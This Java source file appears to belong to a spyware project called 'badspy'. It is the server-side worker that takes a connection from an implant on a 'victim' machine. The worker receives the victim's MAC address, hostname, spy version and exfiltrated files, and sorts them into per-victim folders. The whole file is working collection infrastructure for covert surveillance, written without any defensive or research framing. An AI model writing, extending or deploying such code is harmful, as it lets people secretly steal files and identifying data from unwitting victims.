package com.blogspot.sontx.badspy.badserver.bo.spyworker;

import com.blogspot.sontx.badspy.badserver.Config;
import com.blogspot.sontx.badspy.badserver.bean.SpyDataHeader;
import com.blogspot.sontx.badspy.badserver.bo.SpyDscFile;
import com.blogspot.sontx.badspy.badserver.bo.Worker;
import com.blogspot.sontx.jini.INIBadFormatException;
import com.blogspot.sontx.jlog.Log;

import java.io.File;
import java.io.IOException;
import java.net.Socket;

/**
 * Copyright 2016 by sontx
 * Created by xuans on 20/4/2016.
 */
public class SpyWorker extends Worker {
    private File victimDir = null;
    private SpyDscFile dscFile = null;

    public SpyWorker(Socket socket) throws IOException {
        super(socket);
    }

    @Override
    protected void processHeader(SpyDataHeader header) throws IOException {
        switch (header.getContentType()) {
            case SpyDataHeader.HEADER_FILE:
                receiveFile(header.getContentLength());
                break;
            case SpyDataHeader.HEADER_MAC:
                receiveMAC(header.getContentLength());
                break;
            case SpyDataHeader.HEADER_HOSTNAME:
                receiveHostName(header.getContentLength());
                break;
            case SpyDataHeader.HEADER_VERSION:
                receiveVersion(header.getContentLength());
                break;
        }
    }

    private void receiveVersion(int contentLength) throws IOException {
        if (victimDir == null) {
            Log.e("No victim directory exists!");
            return;
        }
        Log.i("Receiving spy version...");
        SpyVersionReceiver receiver = new SpyVersionReceiver(reader, writer, contentLength, victimDir);
        receiver.start();
        String spyVersion = receiver.getSpyVersion();
        if (spyVersion != null) {
            try {
                File verDir = new File(victimDir, spyVersion);
                if (!verDir.isDirectory())
                    verDir.mkdirs();
                dscFile = new SpyDscFile(new File(verDir, Config.DSC_FILENAME).getPath());
            } catch (INIBadFormatException e) {
                e.printStackTrace();
            }
        }
    }

    private void receiveHostName(int contentLength) throws IOException {
        if (dscFile == null) {
            Log.e("Not determine spy version");
            return;
        }
        Log.i("Receiving hostname...");
        SpyHostNameReceiver receiver = new SpyHostNameReceiver(reader,writer, contentLength, dscFile);
        receiver.start();
    }

    private void receiveMAC(int contentLength) throws IOException {
        Log.i("Receiving MAC address...");
        SpyMACReceiver receiver = new SpyMACReceiver(reader, writer, contentLength);
        receiver.start();
        if (receiver.getVictimDir() != null)
            this.victimDir = new File(Config.LOGGING_DIR, receiver.getVictimDir());
    }

    private void receiveFile(int contentLength) throws IOException {
        if (dscFile == null) {
            Log.e("No victim directory exists!");
            return;
        }
        Log.i(String.format("Receiving file[%d bytes]...", contentLength));
        SpyFileReceiver receiver = new SpyFileReceiver(reader, writer, contentLength, dscFile.getBaseFile().getParentFile());
        try {
            receiver.start();
            Log.i("Received file");
        } finally {
            receiver.close();
        }
    }
}
